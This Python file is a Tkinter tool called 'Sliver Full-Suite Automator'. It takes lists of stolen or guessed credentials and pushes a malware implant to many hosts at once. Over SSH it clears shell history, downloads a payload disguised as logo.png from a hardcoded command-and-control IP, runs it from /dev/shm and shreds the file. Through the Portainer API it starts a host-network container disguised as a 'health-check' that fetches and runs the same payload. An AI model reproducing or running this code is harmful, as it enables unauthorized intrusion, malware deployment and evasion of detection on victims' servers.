import tkinter as tk
from tkinter import filedialog, scrolledtext
import paramiko
import requests
import re
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings for old Portainer versions
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIG ---
C2_IP = "94.156.152.36"
C2_PORT = "8080"
PAYLOAD_URL = f"http://{C2_IP}:{C2_PORT}/logo.png"

class FullSuiteDeployer:
    def __init__(self, root):
        self.root = root
        self.root.title("Sliver Full-Suite Automator")
        self.log_area = scrolledtext.ScrolledText(root, bg="black", fg="#33ff33", font=("Consolas", 9))
        self.log_area.pack(fill=tk.BOTH, expand=True)
        
        frame = tk.Frame(root)
        frame.pack(fill=tk.X)
        tk.Button(frame, text="RUN SSH BATCH", command=lambda: self.launch('ssh'), bg="blue", fg="white").pack(side=tk.LEFT, expand=True)
        tk.Button(frame, text="RUN PORTAINER BATCH", command=lambda: self.launch('portainer'), bg="darkred", fg="white").pack(side=tk.LEFT, expand=True)

    def log(self, msg):
        self.log_area.insert(tk.END, f"{msg}\n")
        self.log_area.see(tk.END)

    def ssh_worker(self, host, user, pwd):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.log(f"[*] Trying SSH {user}@{host}...")
            
            client.connect(host, username=user, password=pwd, timeout=12, look_for_keys=False, allow_agent=False)
            
            # 1. Install Dependencies & Stealth Setup
            commands = [
                "unset HISTFILE",
                "export PATH=$PATH:/usr/local/bin:/usr/bin:/bin",
                "(which curl || which wget || yum install -y curl || apt-get install -y curl || apk add curl) > /dev/null 2>&1",
                f"(curl -s {PAYLOAD_URL} -o /dev/shm/.v || wget -q {PAYLOAD_URL} -O /dev/shm/.v)",
                "chmod +x /dev/shm/.v",
                "(/dev/shm/.v &)",
                "sleep 1 && (shred -u /dev/shm/.v || rm -f /dev/shm/.v) && history -c"
            ]
            
            full_cmd = " ; ".join(commands)
            client.exec_command(f"nohup sh -c '{full_cmd}' > /dev/null 2>&1 &")
            
            client.close()
            return f"[SUCCESS] {host}: Authenticated & Payload Pushed"
            
        except paramiko.AuthenticationException:
            return f"[AUTH_FAILED] {host}: Invalid Credentials"
        except Exception as e:
            return f"[ERROR] {host}: {str(e)}"

    def portainer_worker(self, url, user, pwd):
        base = url.rstrip('/')
        try:
            # 1. AUTH CHECK
            r = requests.post(f"{base}/api/auth", json={"username": user, "password": pwd}, timeout=10, verify=False)
            if r.status_code != 200:
                return f"[AUTH_FAILED] Portainer {base}: {r.status_code}"
            
            token = r.json().get('jwt')
            headers = {"Authorization": f"Bearer {token}"}
            
            # 2. ENDPOINT DISCOVERY
            e_req = requests.get(f"{base}/api/endpoints", headers=headers, timeout=10, verify=False)
            endpoints = e_req.json()
            if not endpoints:
                return f"[NO_ENDPOINTS] {base}"
            
            eid = endpoints[0]['Id']
            
            # 3. NETWORK BYPASS & DEPLOYMENT
            # We use 'host' network mode to ensure the container can reach your C2 IP
            container_conf = {
                "Image": "alpine:latest",
                "Cmd": ["sh", "-c", f"apk add --no-cache curl wget && (curl -s {PAYLOAD_URL} -o /dev/shm/.v || wget -q {PAYLOAD_URL} -O /dev/shm/.v) && chmod +x /dev/shm/.v && /dev/shm/.v"],
                "HostConfig": {
                    "AutoRemove": True,
                    "NetworkMode": "host" 
                }
            }
            
            name = f"health-check-{base64.b32encode(user.encode()).decode()[:4].lower()}"
            create = requests.post(f"{base}/api/endpoints/{eid}/docker/containers/create?name={name}", 
                                   headers=headers, json=container_conf, verify=False)
            
            if create.status_code == 201:
                cid = create.json()['Id']
                requests.post(f"{base}/api/endpoints/{eid}/docker/containers/{cid}/start", headers=headers, verify=False)
                return f"[SUCCESS] Portainer {base}: Container Started"
            
            return f"[DEPLOY_FAILED] Portainer {base}: {create.text}"
            
        except Exception as e:
            return f"[ERROR] Portainer {base}: {str(e)}"

    def launch(self, mode):
        path = filedialog.askopenfilename()
        if not path: return
        
        def run():
            with open(path, 'r') as f:
                raw_data = f.read()
            
            # Improved regex to catch different formats
            targets = re.findall(r'([\w\.-]+)\s+([\w\.-]+):([\S]+)', raw_data)
            self.log(f"[*] Found {len(targets)} potential targets. Starting threads...")

            with ThreadPoolExecutor(max_workers=20) as executor:
                func = self.ssh_worker if mode == 'ssh' else self.portainer_worker
                futures = {executor.submit(func, h, u, p): h for h, u, p in targets}
                
                for future in as_completed(futures):
                    self.log(future.result())
            
            self.log("[!] Batch Processing Finished.")

        threading.Thread(target=run, daemon=True).start()

import base64
if __name__ == "__main__":
    root = tk.Tk()
    FullSuiteDeployer(root)
    root.mainloop()
